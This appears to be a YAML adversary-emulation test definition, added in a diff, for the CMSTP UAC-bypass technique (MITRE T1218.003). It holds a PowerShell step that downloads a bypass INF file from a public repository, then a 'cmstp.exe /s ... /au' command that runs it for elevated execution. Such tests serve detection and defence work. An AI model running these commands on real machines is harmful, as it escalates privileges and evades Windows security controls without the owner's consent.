@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: CMSTP Executing UAC Bypass
+description: |
+    Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file
+args:
+    - name: inf_file_uac
+      type: path
+      default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf
+uuid: 748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.003: CMSTP'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        INF file must exist on disk at specified location (#{inf_file_uac})
+      inline: |
+        if (Test-Path "#{inf_file_uac}") {exit 0} else {{New-Item -Type Directory (split-path "#{inf_file_uac}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
+        }}
+      executor: powershell
+    - name: cmstp-executing-uac-bypass
+      inline: |
+        cmstp.exe /s "{{.Args.inf_file_uac}}" /au
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
